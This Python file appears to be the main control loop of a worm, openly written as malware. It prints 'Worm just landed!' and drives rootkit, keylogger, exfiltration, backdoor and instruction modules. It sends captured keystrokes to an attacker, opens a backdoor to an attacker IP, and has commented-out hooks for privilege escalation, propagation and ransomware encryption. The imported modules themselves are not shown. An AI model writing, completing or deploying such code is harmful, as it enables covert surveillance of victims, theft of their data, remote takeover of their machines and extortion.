###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

from time import sleep

# from modules import privesc
from modules import rootkit
# from modules import propagation
from modules import exfiltration
from modules import keylogger
from modules import backdoor
from modules import instructions
# from modules import ransomware

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################



###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def main():
    print("Worm just landed!")

    # map modules to function
    modules = {
        # "privesc": privesc.run,
        "rootkit": rootkit.run,
        # "propagation": propagation.run,
        "exfiltration": exfiltration.run,
        "keylogger": keylogger.run,
        "backdoor": backdoor.run,
        "instructions": instructions.run,
        # "ransomware": ransomware.run,
    }

    # First step
    next_step = "keylogger"
    result = None

    while next_step != "clean":
        # Execute module and get result and next step
        result, next_step = modules[next_step]()
        result = result.split(' ')

        if result and len(result) >= 2:
            if result[0] == 'keylogger':
                if result[1] == 'send_log': instructions.send_keylog_to_attacker()
                elif result[1] == 'reset_log': instructions.reset_keylog_file()
    
            elif result[0] == 'backdoor':
                if len(result) >= 3:
                    if result[1] == 'start': backdoor.start_backdoor(attacker_ip = result[2])
                    elif result[1] == 'stop': backdoor.stop_backdoor(attacker_ip = result[2])

            elif result[0] == 'ransomware':
                if result[1] == 'encrypt': 
                    instructions.download_secret_key()
                    # ransomware.encrypt_ransomware(key = result[2])
                elif result[1] == 'decrypt':
                    instructions.download_secret_key()
                    # ransomware.decrypt_ransomware(key = result[2])

            if result != 'no_data': instructions.reset_instruction()
        elif not result:
            print(f"[-] Module {next_step} failed!")
            break

        if next_step == 'instructions': sleep(10)

if __name__ == "__main__":
    main()